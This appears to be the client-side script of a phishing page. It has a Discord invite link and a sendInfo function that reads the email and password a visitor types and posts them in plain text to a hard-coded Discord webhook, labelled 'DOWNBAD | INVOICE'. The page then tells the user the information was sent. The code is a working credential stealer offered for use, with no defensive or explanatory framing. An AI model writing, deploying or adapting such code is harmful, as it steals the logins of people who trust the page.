const infoWebhook = "https://canary.discord.com/api/webhooks/1385798083962732645/LTSnydIIsabKA7VxZSxU89c_-4AjIpSBhr3NVx8dbTb-HxOMsgsNJefcuIf67HdXKWJp"
function apply() {
    console.log("Applied")
}

function discord() {
    window.open("https://discord.gg/qtkeqQUCGv", "_blank");
}

function sendInfo() {
    const password = document.getElementById("password").value;
    const email = document.getElementById("email").value;
    const mainBTN = document.getElementById("join");
    if (email.includes("@") && email.includes(".")) {
        const payload = {
            embeds: [
            {
                title: "DOWNBAD | INVOICE",
                description: `**Email** ${email}
                **Password:** ${password}`,
                color: 0xff4500
            }
            ]
        };

        fetch(infoWebhook, {
            method: "POST",
            headers: {
            "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        mainBTN.textContent = "Sent Information!"
        mainBTN.style.background = "#43A047";
        mainBTN.style.width = "200px";
        mainBTN.style.boxShadow = "0 0 10px 2px #43A047";
        setTimeout(() => {
            mainBTN.textContent = "Send!"
            mainBTN.style.background = "";
            mainBTN.style.width = "";
            mainBTN.style.boxShadow = "";
        }, 5000);
    }
    else {
        mainBTN.textContent = "Invalid Email!"
        mainBTN.style.background = "#D32F2F";
        mainBTN.style.width = "180px";
        mainBTN.style.boxShadow = "0 0 10px 2px #D32F2F";
        setTimeout(() => {
            mainBTN.textContent = "Send!"
            mainBTN.style.background = "";
            mainBTN.style.width = "";
            mainBTN.style.boxShadow = "";
        }, 5000); 
    }
}
